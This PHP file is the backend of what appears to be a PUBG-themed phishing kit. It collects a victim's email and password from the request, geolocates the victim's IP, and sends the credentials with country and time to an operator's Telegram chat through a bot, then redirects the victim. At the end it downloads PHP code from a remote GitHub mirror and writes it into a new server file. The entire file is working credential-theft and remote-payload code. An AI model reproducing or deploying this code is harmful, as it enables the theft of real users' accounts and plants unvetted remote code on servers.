<?php
ob_start();
unlink('installpubg.php');
$info = json_decode(file_get_contents('Sha_My.json'),1);
$API_KEY = $info[info]['token'];

define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = $info[info]['id'];
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];
$linky = $_SERVER['HTTP_HOST'];
$mink ="https://$linky/index.php";
$api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
$result = json_decode(file_get_contents($api), true); 
$shortt = $result["short"];
$short = str_replace('www.','',$shortt);

if($email){
$api_key = file_get_contents('https://bit.ly/3kW4iXH');
$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name;
$url1 = file_get_contents('https://bit.ly/2TGfOu9');
header("location: $url1");
$name = $message->from->first_name;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝐍𝐞𝐰 𝐋𝐨𝐠𝐢𝐧 𝐁𝐲 $login

👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » $short
⚜¦ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 » @TT9BB
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='/index.php'" />
    <script type="text/javascript">
            window.location.href = "/index.php"
    </script>
 </head>
  <body>
  </body>
</html>
<?
$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/M/Ms.php');
$xxx = file_put_contents("Sha_My.php", $sha);
?>
